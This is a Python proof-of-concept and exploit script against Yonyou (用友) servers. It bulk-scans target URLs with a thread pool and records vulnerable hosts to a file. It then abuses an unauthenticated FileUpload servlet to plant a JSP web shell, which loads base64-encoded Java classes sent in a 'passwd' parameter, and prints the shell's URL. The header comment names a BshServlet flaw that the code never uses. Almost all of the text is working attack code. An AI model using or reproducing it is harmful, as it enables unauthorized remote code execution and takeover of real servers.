# 用友
# /servlet/~ic/bsh.servlet.BshServlet 它可以输入命令 进而导致命令执行
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   _____ _____  _____        _    _  ___   
  / ____|  __ \|  __ \      | |  | |/ _ \  
 | |  __| |__) | |__) |_____| |  | | (_) | 
 | | |_ |  _  /|  ___/______| |  | |> _ <  
 | |__| | | \ \| |          | |__| | (_) | 
  \_____|_|  \_\_|           \____/ \___/  
                                           
                                           
                                 version:1.0.8 
                                 author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="用友poc&exp")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Content-Length": "24",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=---------------------------32840991842344344364451981273",
        "Origin": "null",
        "Upgrade-Insecure-Requests": "1",
    }
    data = '<% out.println("123");%>'
    payload_url = '/servlet/FileUpload?fileName=bivlegk.jsp&actionID=update'
    url = target+payload_url
    try:
        # res = requests.get(url=url)
        res2 = requests.post(url=url,headers=headers,data=data)
        if res2.status_code == 200:
            # match = re.search(r'<pre>(.*?)</pre>',res2.text,re.S)
            # # print(match.group(1))
            # if 'SIS2402' in match.group(1):
                print(f"[+该url存在漏洞{target}")
                with open('nc.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False
def exp(target):
    print("漏洞利用>>>>>>>>>>>getshell<<<<<<<<<<<")
    time.sleep(2)
    # while True:
    #     cmd = input('请输入你要执行的命令>')
    #     if cmd == 'q':
    #         print("正在退出，请等候....")
    #         break
    headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
            "Content-Length": "24",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=---------------------------32840991842344344364451981273",
            "Origin": "null",
            "Upgrade-Insecure-Requests": "1",
        }            
    data = """<% out.println("0921");%><%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>"""
    res = requests.post(url=target+'/servlet/FileUpload?fileName=ey.jsp&actionID=update',headers=headers,data=data,verify=False)
        # print(res.text)
        # match = re.search(r'<pre>(.*?)</pre>',res.text,re.S)
        # print(match.group(1).strip())
    res1 = requests.get(url=target+'/R9iPortal/upload/ey.jsp',verify=False)
    print(res1.text)
    if "0921" in res1.text:
        shell_url = target +"/R9iPortal/upload/ey.jsp"
        print(f"[+]{shell_url}\n[+]passwd:passwd")
    else:
        print("上传失败") 
if __name__ == '__main__':
    main()
